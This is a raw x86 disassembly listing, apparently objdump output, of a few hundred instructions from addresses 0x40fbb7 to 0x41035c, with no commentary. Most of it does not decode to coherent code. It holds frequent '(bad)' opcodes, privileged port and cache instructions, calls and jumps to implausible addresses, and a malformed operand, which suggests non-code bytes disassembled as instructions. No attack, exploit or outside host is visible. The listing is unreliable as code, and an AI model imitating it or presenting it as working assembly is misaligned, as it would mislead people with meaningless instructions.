  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
